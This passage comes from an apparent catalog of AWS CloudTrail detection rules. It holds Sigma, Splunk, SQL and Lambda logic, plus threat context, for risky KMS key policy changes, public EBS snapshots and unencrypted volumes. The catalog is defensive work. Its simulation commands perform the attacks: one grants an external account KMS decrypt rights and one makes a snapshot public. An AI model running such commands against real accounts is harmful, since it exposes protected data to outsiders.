| where like(requestParameters.policy, "%\\"Principal\\":\\"*\\"%") OR like(requestParameters.policy, "%\\"Principal\\":{\\"AWS\\":\\"*\\"}%") OR like(requestParameters.policy, "%:root\\"%") OR like(requestParameters.policy, "%\\"kms:*\\"%") OR like(requestParameters.policy, "%\\"kms:Decrypt\\"%") OR like(requestParameters.policy, "%\\"kms:GenerateDataKey%") OR like(requestParameters.policy, "%\\"kms:CreateGrant\\"%") OR like(requestParameters.policy, "%\\"kms:PutKeyPolicy\\"%") OR like(requestParameters.policy, "%\\"kms:ScheduleKeyDeletion\\"%") OR requestParameters.bypassPolicyLockoutSafetyCheck=true
| table _time, userIdentity.type, userIdentity.arn, requestParameters.keyId, requestParameters.policyName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, requestParameters.keyId, requestParameters.policyName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'kms.amazonaws.com'
  AND eventName = 'PutKeyPolicy'
  AND (
    requestParameters.policy LIKE '%"Principal":"*"%'
    OR requestParameters.policy LIKE '%"Principal":{"AWS":"*"}%'
    OR requestParameters.policy LIKE '%:root"%'
    OR requestParameters.policy LIKE '%"kms:*"%'
    OR requestParameters.policy LIKE '%"kms:Decrypt"%'
    OR requestParameters.policy LIKE '%"kms:GenerateDataKey%'
    OR requestParameters.policy LIKE '%"kms:CreateGrant"%'
    OR requestParameters.policy LIKE '%"kms:PutKeyPolicy"%'
    OR requestParameters.policy LIKE '%"kms:ScheduleKeyDeletion"%'
    OR requestParameters.bypassPolicyLockoutSafetyCheck = true
  )
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, requestParameters.keyId, requestParameters.policyName, requestParameters.policy, requestParameters.bypassPolicyLockoutSafetyCheck, sourceIPAddress
| filter eventSource = "kms.amazonaws.com"
| filter eventName = "PutKeyPolicy"
| filter requestParameters.policy like /"Principal":"\*"|"Principal":\{"AWS":"\*"\}|:root"|kms:\*|kms:Decrypt|kms:GenerateDataKey|kms:CreateGrant|kms:PutKeyPolicy|kms:ScheduleKeyDeletion/ or requestParameters.bypassPolicyLockoutSafetyCheck = true
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.kms"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["kms.amazonaws.com"], eventName: ["PutKeyPolicy"] } }, null, 2),
      lambda: `"""
KMS Key Policy Modified
Trigger: EventBridge rule matching PutKeyPolicy.
Use for: Real-time parsing of risky KMS policy changes.
"""

RISKY_POLICY_MARKERS = ('"Principal":"*"', '"Principal":{"AWS":"*"}', ':root"', '"kms:*"', '"kms:Decrypt"', '"kms:GenerateDataKey', '"kms:CreateGrant"', '"kms:PutKeyPolicy"', '"kms:ScheduleKeyDeletion"')

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "kms.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") != "PutKeyPolicy":
        return {"matched": False}

    request = detail.get("requestParameters", {})
    policy = request.get("policy", "")
    bypass = request.get("bypassPolicyLockoutSafetyCheck", False)

    if not bypass and not any(marker in policy for marker in RISKY_POLICY_MARKERS):
        return {"matched": False}

    return {
        "matched": True,
        "alert": {
            "rule_id": "det-020",
            "title": "KMS Key Policy Modified",
            "severity": "High",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "key_id": request.get("keyId"),
            "policy_name": request.get("policyName"),
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "kms.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.keyId", "requestParameters.policy", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "kms.amazonaws.com", eventName: "PutKeyPolicy", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { keyId: "arn:aws:kms:us-east-1:123456789012:key/xxx", policyName: "default" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who modified the key policy.", "Inspect the new policy for unauthorized principals.", "Verify if this was routine key management.", "Review key usage for anomalies."],
    testingSteps: ["Modify a KMS key policy (PutKeyPolicy).", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
    lifecycle: {
      whyItMatters: "A KMS key policy is the primary authorization boundary for a customer managed key. When an attacker broadens principals, grants risky cryptographic or grant-management actions, or enables cross-account use, they can turn one policy change into durable data access, privilege expansion, or key-administration persistence.",
      threatContext: {
        attackerBehavior: "An attacker with kms:PutKeyPolicy can rewrite the key policy to add wildcard principals, external AWS accounts, overly broad actions such as kms:Decrypt or kms:GenerateDataKey*, or administrative actions such as kms:PutKeyPolicy, kms:CreateGrant, kms:ScheduleKeyDeletion, and kms:DisableKey.",
        realWorldUsage: "KMS policy abuse appears in cloud intrusion tradecraft as part of post-compromise privilege expansion, persistence, and data-access enablement. It is especially relevant where the same customer managed keys protect Secrets Manager secrets, EBS snapshots, S3 objects, or shared application encryption paths.",
        whyItMatters: "Not every PutKeyPolicy is malicious, but the dangerous subset is high signal: broad principals, root principals from other accounts, wildcard access, permissive grant creation, and cross-account use permissions materially change who can use or control the key.",
        riskAndImpact: "If this goes undetected, attackers can enable decryption of protected data, allow external-account use of the key, create grants for downstream AWS service abuse, retain long-term control over a sensitive key, or make the key effectively unmanageable.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events)", "GetKeyPolicy or Config history for policy diffing"],
        requiredFields: ["eventSource", "eventName", "readOnly", "errorCode", "userIdentity.type", "userIdentity.arn", "requestParameters.keyId", "requestParameters.policyName", "requestParameters.policy", "requestParameters.bypassPolicyLockoutSafetyCheck", "awsRegion", "recipientAccountId", "sourceIPAddress", "eventTime"],
        loggingRequirements: ["CloudTrail management events must include KMS API activity in all relevant Regions.", "The pipeline must preserve the full requestParameters.policy string.", "Normalize escaped JSON consistently so wildcard principals, external account ARNs, root principals, and broad action lists can be parsed reliably."],
        limitations: ["A raw PutKeyPolicy event by itself is too broad for paging in many environments; high-fidelity alerting requires parsing the submitted policy document.", "Formatting, escaping, or parser differences can make naive string matching brittle unless the policy is decoded into structured JSON.", "Cross-account use of a KMS key requires both the local key policy and IAM permission in the external account."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "Should equal kms.amazonaws.com" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "PutKeyPolicy API call" },
          { rawPath: "eventTime", normalizedPath: "@timestamp", notes: "Canonical event time" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor who changed the key policy" },
          { rawPath: "requestParameters.keyId", normalizedPath: "aws.kms.key.id", notes: "Target key ARN or key ID" },
          { rawPath: "requestParameters.policy", normalizedPath: "aws.kms.key.policy.document", notes: "Submitted key policy JSON string" },
          { rawPath: "requestParameters.bypassPolicyLockoutSafetyCheck", normalizedPath: "aws.kms.key.policy.bypass_lockout_safety_check", notes: "True is high risk" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["configuration"], type: ["change"], action: "PutKeyPolicy", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" }, region: "us-east-1" },
          aws: { kms: { key: { id: "arn:aws:kms:us-east-1:123456789012:key/xxx", policy: { bypass_lockout_safety_check: false } } } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Principal Exposure Analysis", description: "Parse the new key policy to identify who now has access or administrative control over the key.", examples: ["Principal = * without restrictive conditions", "Principal includes arn:aws:iam::444455556666:root", "Principal includes unfamiliar external roles"], falsePositiveReduction: "Separates approved KMS admins and known service integrations from risky wildcard, root, or external principals." },
        { dimension: "Permission Breadth and Abuse Path", description: "Classify the actions granted so responders can distinguish narrow maintenance changes from access-expanding or destructive changes.", examples: ["kms:*", "kms:Decrypt", "kms:GenerateDataKey*", "kms:CreateGrant", "kms:ScheduleKeyDeletion"], falsePositiveReduction: "Reduces noise by focusing alerts on policy changes that materially increase data access, persistence, or destructive capability." },
        { dimension: "Cross-Account and Organizational Trust Context", description: "Validate whether newly granted external principals are expected and constrained by organizational design.", examples: ["Approved DR account versus unknown third-party account", "Organization ID allowlist", "External role added without expected conditions"], falsePositiveReduction: "Prevents expected shared-services patterns from paging while highlighting unapproved external exposure." },
        { dimension: "Key and Data Sensitivity", description: "Measure the blast radius of the policy change based on what the key protects.", examples: ["Alias indicates prod secrets or RDS", "Key used by Secrets Manager or S3 SSE-KMS", "Shared platform key"], falsePositiveReduction: "Keeps routine low-risk maintenance on isolated keys from looking equivalent to policy changes on highly sensitive shared keys." },
      ],
      logicExplanation: {
        humanReadable: "This detection should not page on every successful PutKeyPolicy call because some KMS administration is legitimate. The production-grade version should parse the submitted key policy and alert only when the change introduces risky principals, broad permissions, cross-account exposure, or lockout-bypass behavior.",
        conditions: ["eventSource equals kms.amazonaws.com", "eventName equals PutKeyPolicy", "readOnly equals false", "errorCode is absent", "requestParameters.policy is present and parseable", "alert if policy Principal contains wildcard or unapproved external principals, or if policy Action includes broad cryptographic or administrative permissions, or if bypassPolicyLockoutSafetyCheck equals true"],
        tuningGuidance: "1. Decode and parse requestParameters.policy into structured JSON before matching. 2. Maintain allowlists for approved external accounts, service principals, and IaC roles. 3. Score risk by both permission breadth and key sensitivity.",
        whenToFire: "Fire immediately when the policy introduces wildcard principals, unapproved external principals, broad cryptographic access, broad admin actions, or lockout-bypass behavior.",
      },
      simulationCommand: "KEY_ARN='arn:aws:kms:us-east-1:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab'; cat > /tmp/kms-policy-risky.json <<'EOF'\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [{\"Sid\":\"EnableIAMUserPermissions\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::111122223333:root\"},\"Action\":\"kms:*\",\"Resource\":\"*\"},{\"Sid\":\"AllowExternalDecrypt\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::444455556666:root\"},\"Action\":[\"kms:Decrypt\",\"kms:GenerateDataKey*\",\"kms:DescribeKey\"],\"Resource\":\"*\"}]\n}\nEOF\naws kms put-key-policy --key-id \"$KEY_ARN\" --policy-name default --policy file:///tmp/kms-policy-risky.json",
      quality: {
        signalQuality: 8,
        falsePositiveRate: "Low-Medium when scoped to risky principals, broad access, cross-account exposure, or lockout bypass; High if every PutKeyPolicy event is alerted",
        expectedVolume: "0-5 alerts/month per account in mature environments; org-dependent and higher in KMS-heavy platforms",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["EventBridge + Lambda", "CloudWatch Logs Insights", "Athena / CloudTrail Lake scheduled query", "Splunk or SIEM pipeline with JSON parsing"],
        scheduling: "Prefer real-time streaming for high-risk policy changes, because new principals may be able to use the key immediately. If the analytics platform cannot parse the policy in-stream, run a short scheduled parser every 5-15 minutes.",
        considerations: ["Store or reconstruct the previous policy so responders can diff old versus new principals, actions, and conditions.", "Keep explicit inventories of approved external accounts, service-integrated use cases, and expected KMS admins.", "Correlate with subsequent CreateGrant, Decrypt, GenerateDataKey, DisableKey, or ScheduleKeyDeletion activity for higher confidence."],
      },
    },
  },

  // --- EBS ---
  {
    id: "det-021",
    title: "EBS Snapshot Made Public",
    description: "Detects when an EBS snapshot is shared publicly, potentially exposing sensitive data.",
    awsService: "EBS",
    relatedServices: ["EC2"],
    severity: "Critical",
    tags: ["EBS", "Snapshot", "Data Exposure"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Intentional sharing of non-sensitive AMI snapshots"],
    rules: {
      sigma: `title: EBS Snapshot Made Public
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2.amazonaws.com
    eventName: ModifySnapshotAttribute
  public_group:
    requestParameters.createVolumePermission.add.items{}.group: 'all'
  public_group_legacy:
    requestParameters.groupNames:
      - all
  condition: selection and (public_group or public_group_legacy)
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com eventName=ModifySnapshotAttribute
| where like(requestParameters, "%all%")
| table _time, userIdentity.type, userIdentity.arn, requestParameters.snapshotId, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, requestParameters.snapshotId, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2.amazonaws.com'
  AND eventName = 'ModifySnapshotAttribute'
  AND (
    requestParameters LIKE '%"group":"all"%'
    OR requestParameters LIKE '%"groupNames"%all%'
  )
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, requestParameters.snapshotId, requestParameters.createVolumePermission, sourceIPAddress
| filter eventSource = "ec2.amazonaws.com"
| filter eventName = "ModifySnapshotAttribute"
| filter requestParameters like /all/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["ModifySnapshotAttribute"] } }, null, 2),
      lambda: `"""
EBS Snapshot Made Public
Trigger: EventBridge rule matching ModifySnapshotAttribute.
Use for: Real-time alerting on public EBS snapshot exposure.
"""

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "ec2.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") != "ModifySnapshotAttribute":
        return {"matched": False}

    request = str(detail.get("requestParameters", {}))
    if '"group":"all"' not in request and "groupNames" not in request:
        return {"matched": False}

    return {
        "matched": True,
        "alert": {
            "rule_id": "det-021",
            "title": "EBS Snapshot Made Public",
            "severity": "Critical",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "snapshot_id": detail.get("requestParameters", {}).get("snapshotId"),
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.snapshotId", "requestParameters.createVolumePermission", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "ModifySnapshotAttribute", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { snapshotId: "snap-xxx", createVolumePermission: { add: { items: [{ group: "all" }] } } }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who made the snapshot public.", "Assess whether the snapshot contains sensitive data.", "Verify if this was for AMI sharing.", "Revoke public access if unauthorized."],
    testingSteps: ["Modify snapshot attribute to add group 'all'.", "Verify CloudTrail captures ModifySnapshotAttribute.", "Run the detection to confirm the alert triggers."],
    lifecycle: {
      whyItMatters: "Making an EBS snapshot public is a high-impact exposure event because any AWS account can use that snapshot to create a volume and inspect its contents.",
      threatContext: {
        attackerBehavior: "An attacker with ec2:ModifySnapshotAttribute can add the public all group to a snapshot's createVolumePermission, turning a private backup into globally accessible storage.",
        realWorldUsage: "Public snapshot exposure is more commonly seen as cloud data exposure, post-compromise collection, and red-team tradecraft than as a noisy day-to-day admin action.",
        whyItMatters: "This is one of the clearest control-plane indicators that sensitive block-storage data may have been exposed outside intended trust boundaries.",
        riskAndImpact: "If the snapshot contains application data, credentials, database files, or filesystem artifacts, public access can lead to broad unauthorized disclosure and follow-on compromise.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events)"],
        requiredFields: ["eventSource", "eventName", "userIdentity.arn", "userIdentity.type", "requestParameters.snapshotId", "requestParameters.groupNames", "requestParameters.createVolumePermission", "sourceIPAddress", "recipientAccountId", "eventTime", "errorCode"],
        loggingRequirements: ["CloudTrail management events must be enabled for EC2/EBS APIs.", "Preserve full requestParameters because public-sharing evidence may appear in either groupNames or nested createVolumePermission fields.", "Maintain regional awareness of EBS block-public-access state for investigation context."],
        limitations: ["Already-public snapshots do not generate fresh events.", "If EBS block public access is enabled, the attempt may fail or the snapshot may not be publicly reachable, but the event still reflects dangerous intent.", "Approved AMI sharing to specific accounts should not be conflated with public snapshot sharing."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "CloudTrail provider; should be ec2.amazonaws.com" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "API action; ModifySnapshotAttribute" },
          { rawPath: "eventTime", normalizedPath: "@timestamp", notes: "Primary event timestamp" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor ARN" },
          { rawPath: "requestParameters.snapshotId", normalizedPath: "aws.ec2.snapshot.id", notes: "Target snapshot" },
          { rawPath: "requestParameters.createVolumePermission", normalizedPath: "aws.ec2.snapshot.createVolumePermission", notes: "Canonical permission mutation payload; parse for all" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["configuration"], type: ["change"], action: "ModifySnapshotAttribute", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" }, region: "us-east-1" },
          aws: { ec2: { snapshot: { id: "snap-xxx", createVolumePermission: { exposure: "public" } } } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Identity Context", description: "Adds owner, role purpose, federation source, and normal administrative scope for the actor that changed snapshot permissions.", examples: ["Okta group membership", "role owner from IAM catalog", "break-glass role indicator"], falsePositiveReduction: "Helps suppress known image-publishing or platform roles while escalating unexpected actors." },
        { dimension: "Snapshot Sensitivity", description: "Adds source volume tags, attached instance metadata, data classification, and whether the snapshot is tied to production, security, or regulated workloads.", examples: ["source volume tags: prod, database", "attached instance name", "CMDB application criticality"], falsePositiveReduction: "Allows stronger alerting on sensitive snapshots and softer handling of low-risk lab artifacts." },
        { dimension: "Image Publishing Context", description: "Distinguishes direct public snapshot exposure from sanctioned image-distribution workflows such as Image Builder pipelines or approved public AMI publication.", examples: ["EC2 Image Builder role", "golden-image pipeline tag", "AMI ID linked to snapshot"], falsePositiveReduction: "Prevents approved image pipeline activity from being treated as generic malicious exposure." },
        { dimension: "Exposure Guardrails", description: "Adds the regional EBS block-public-access state, snapshot encryption state, and prior permission baseline.", examples: ["snapshot block public access enabled", "snapshot encrypted with CMK", "previous permission state private"], falsePositiveReduction: "Separates successful public exposure from blocked or already-known posture conditions." },
      ],
      logicExplanation: {
        humanReadable: "This detection should identify the specific control-plane action that makes an EBS snapshot public: ModifySnapshotAttribute where the request adds the public all group. The rule should stay narrowly focused on public exposure, not broader sharing, because explicit account sharing and AMI workflows are materially different.",
        conditions: ["eventSource equals ec2.amazonaws.com", "eventName equals ModifySnapshotAttribute", "request indicates public access by adding group all via requestParameters.groupNames or requestParameters.createVolumePermission", "prefer errorCode is null for the main alert"],
        tuningGuidance: "1. Do not suppress approved private AMI sharing or snapshot sharing to specific account IDs under this rule. 2. Allowlist only well-governed image publishing roles after verifying they intentionally publish public artifacts. 3. Add a companion posture hunt for existing public snapshots because this rule only catches the permission-change event.",
        whenToFire: "Fire on every successful transition to public snapshot access. In most environments this should be extremely rare to near-zero.",
      },
      simulationCommand: "aws ec2 modify-snapshot-attribute --snapshot-id snap-0abc123def4567890 --attribute createVolumePermission --operation-type add --group-names all --region us-east-1",
      quality: {
        signalQuality: 9,
        falsePositiveRate: "Low (true public snapshot exposure is rare; most noise comes from niche image-publishing workflows)",
        expectedVolume: "Near-zero in mature environments; occasional single events in image-publishing or testing accounts",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena (scheduled query)", "CloudWatch Logs Insights", "Splunk", "Datadog", "Panther", "Chronicle", "EventBridge + Lambda"],
        scheduling: "Batch: every 5-15 minutes for centralized CloudTrail analytics. Real-time: EventBridge on CloudTrail management events for immediate alerting.",
        considerations: ["Model public exposure separately from explicit external-account sharing.", "Keep a parallel inventory control for already-public snapshots.", "Correlate with CreateSnapshot and CopySnapshot to understand downstream use."],
      },
    },
  },
  {
    id: "det-022",
    title: "EBS Volume Not Encrypted",
    description: "Detects creation of unencrypted EBS volumes which violates security best practices.",
    awsService: "EBS",
    relatedServices: ["KMS"],
    severity: "Medium",
    tags: ["EBS", "Encryption", "Compliance"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Development environments with relaxed encryption policies"],
    rules: {
      sigma: `title: Unencrypted EBS Volume Created
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2.amazonaws.com
    eventName: CreateVolume
    requestParameters.encrypted: false
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventName=CreateVolume
| where requestParameters.encrypted="false" OR responseElements.encrypted="false"
| table _time, userIdentity.type, userIdentity.arn, requestParameters.encrypted, responseElements.encrypted, responseElements.volumeId, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, requestParameters.encrypted, responseElements.encrypted, responseElements.volumeId, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2.amazonaws.com'
  AND eventName = 'CreateVolume'
  AND (
    requestParameters.encrypted = false
    OR responseElements.encrypted = false
  )
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, requestParameters.encrypted, responseElements.encrypted, responseElements.volumeId, sourceIPAddress
| filter eventSource = "ec2.amazonaws.com"
| filter eventName = "CreateVolume"
| filter requestParameters.encrypted = false or responseElements.encrypted = false
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["CreateVolume"] } }, null, 2),
      lambda: `"""
EBS Volume Not Encrypted
Trigger: EventBridge rule matching CreateVolume.
Use for: Real-time alerting on confirmed or requested unencrypted volume creation.
"""

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "ec2.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") != "CreateVolume":
        return {"matched": False}

    request_encrypted = detail.get("requestParameters", {}).get("encrypted")
    response_encrypted = detail.get("responseElements", {}).get("encrypted")
    if request_encrypted is not False and response_encrypted is not False:
        return {"matched": False}

    return {
        "matched": True,
        "alert": {
            "rule_id": "det-022",
            "title": "EBS Volume Not Encrypted",
            "severity": "Medium",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "volume_id": detail.get("responseElements", {}).get("volumeId"),
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.encrypted", "responseElements.volumeId", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "CreateVolume", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { encrypted: false, size: 100 }, responseElements: { volumeId: "vol-xxx", encrypted: false }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who created the unencrypted volume.", "Verify if the environment has encryption exceptions.", "Assess compliance impact.", "Consider enabling encryption by default."],
    testingSteps: ["Create an EBS volume with encrypted: false.", "Verify CloudTrail captures CreateVolume.", "Run the detection to confirm it triggers."],
    lifecycle: {
      whyItMatters: "Creating an unencrypted EBS volume weakens at-rest protections and can violate both security policy and compliance requirements. The important nuance is that requestParameters.encrypted=false is not enough by itself when regional EBS encryption-by-default is enabled.",
      threatContext: {
        attackerBehavior: "An attacker or negligent admin can create storage without encryption to avoid KMS governance, simplify downstream copying, or stage sensitive data on media with weaker policy controls.",
        realWorldUsage: "In practice this pattern appears more often in posture failures, legacy automation, and exception-heavy environments than in named intrusion reporting.",
        whyItMatters: "This rule is valuable as a security baseline detection, but only high-confidence when the created volume is actually unencrypted.",
        riskAndImpact: "If sensitive data lands on an unencrypted volume, the organization loses an important control boundary around KMS access, auditability, and policy enforcement.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events)"],
        requiredFields: ["eventSource", "eventName", "userIdentity.arn", "userIdentity.type", "requestParameters.encrypted", "requestParameters.kmsKeyId", "requestParameters.snapshotId", "responseElements.volumeId", "responseElements.encrypted", "responseElements.kmsKeyId", "awsRegion", "sourceIPAddress", "eventTime", "errorCode"],
        loggingRequirements: ["CloudTrail management events must be enabled for EC2/EBS APIs.", "Retain both request and response fields; responseElements.encrypted is the most important confirmation field.", "Maintain regional/account-level enrichment for EBS encryption-by-default state."],
        limitations: ["If EBS encryption by default is enabled in the Region, an explicit request for encrypted=false can still result in an encrypted volume.", "Some requests omit requestParameters.encrypted.", "This is often a posture/compliance signal rather than a direct intrusion indicator."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "CloudTrail provider; ec2.amazonaws.com" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "API action; CreateVolume" },
          { rawPath: "eventTime", normalizedPath: "@timestamp", notes: "Primary event timestamp" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor ARN" },
          { rawPath: "requestParameters.encrypted", normalizedPath: "aws.ebs.volume.request.encrypted", notes: "Requested encryption state" },
          { rawPath: "responseElements.encrypted", normalizedPath: "aws.ebs.volume.encrypted", notes: "Final volume encryption state; preferred high-confidence field" },
          { rawPath: "responseElements.volumeId", normalizedPath: "aws.ebs.volume.id", notes: "Created volume ID" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["configuration"], type: ["creation"], action: "CreateVolume", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" }, region: "us-east-1" },
          aws: { ebs: { volume: { id: "vol-xxx", encrypted: false } } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Encryption Baseline Context", description: "Adds the regional EBS encryption-by-default setting and expected default KMS key.", examples: ["GetEbsEncryptionByDefault result", "default EBS KMS key ARN"], falsePositiveReduction: "Suppresses request-only matches when AWS still created an encrypted volume." },
        { dimension: "Volume Purpose and Asset Metadata", description: "Adds tags, application ownership, environment, and whether the created volume is tied to production, CI, or legacy migration workflows.", examples: ["tags: prod, sandbox, migration", "application owner", "CMDB criticality"], falsePositiveReduction: "Separates real control failures on sensitive systems from tolerated lab or migration contexts." },
        { dimension: "Identity and Change Context", description: "Adds role purpose, automation source, ticket/change window, and prior provisioning behavior for the caller.", examples: ["Terraform pipeline role", "approved CAB change", "first-time CreateVolume by this user"], falsePositiveReduction: "Reduces noise from known automation while highlighting unexpected manual activity." },
        { dimension: "Snapshot and Lineage Context", description: "Adds whether the volume was created empty or from a snapshot, and whether the source snapshot itself was encrypted or sensitive.", examples: ["source snapshot encrypted=true", "golden AMI lineage", "database backup snapshot"], falsePositiveReduction: "Helps explain benign legacy restore scenarios and prioritize sensitive lineage." },
      ],
      logicExplanation: {
        humanReadable: "This detection should be modeled as a two-tier rule. The high-confidence branch is actual unencrypted volume creation, confirmed by responseElements.encrypted=false on a successful CreateVolume event. A lower-confidence branch can capture intent when requestParameters.encrypted=false, but it should only escalate if the Region's EBS encryption-by-default setting is disabled.",
        conditions: ["High-confidence branch: eventSource equals ec2.amazonaws.com", "eventName equals CreateVolume", "responseElements.encrypted equals false", "Optional lower-confidence branch: requestParameters.encrypted equals false and regional EBS encryption-by-default is disabled"],
        tuningGuidance: "1. Prefer responseElements.encrypted=false over request-only logic. 2. Join the event to regional encryption-by-default state. 3. Maintain an exception list for approved legacy, lab, or migration workflows.",
        whenToFire: "Fire immediately on confirmed unencrypted volume creation. Route request-only events to a lower-severity queue unless you have verified that default encryption was disabled in that Region.",
      },
      simulationCommand: "aws ec2 create-volume --availability-zone us-east-1a --size 20 --volume-type gp3 --no-encrypted --region us-east-1",
      quality: {
        signalQuality: 6,
        falsePositiveRate: "Medium (posture drift, legacy workflows, and request-only matches need context)",
        expectedVolume: "Near-zero in mature encrypted-by-default orgs; bursty in legacy, dev, or migration-heavy accounts",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena (scheduled query)", "CloudWatch Logs Insights", "Splunk", "Datadog", "Panther", "Chronicle", "EventBridge + Lambda"],
        scheduling: "Batch: every 5-15 minutes for posture reporting. Real-time: EventBridge or streaming SIEM ingestion if you want immediate policy-violation alerts.",
        considerations: ["Do not rely on requestParameters.encrypted=false alone.", "This detection is often better owned jointly by security engineering and cloud governance.", "Use a separate control to detect disabled EBS encryption-by-default."],
      },
    },
  },

  // --- DynamoDB ---
  {
    id: "det-023",
    title: "DynamoDB Table Exported to S3",
    description: "Detects when a DynamoDB table is exported to S3, which could be used for data exfiltration.",
    awsService: "DynamoDB",
    relatedServices: ["S3"],
    severity: "High",
